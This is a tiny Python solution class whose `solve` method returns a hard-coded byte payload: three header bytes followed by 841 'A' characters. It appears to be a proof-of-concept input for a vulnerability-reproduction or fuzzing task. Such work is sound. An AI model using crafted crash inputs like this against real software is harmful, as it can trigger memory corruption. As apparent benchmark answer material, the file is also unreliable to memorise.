class Solution:
    def solve(self, src_path: str) -> bytes:
        return b'\x86\x03\x49' + b'A' * 841
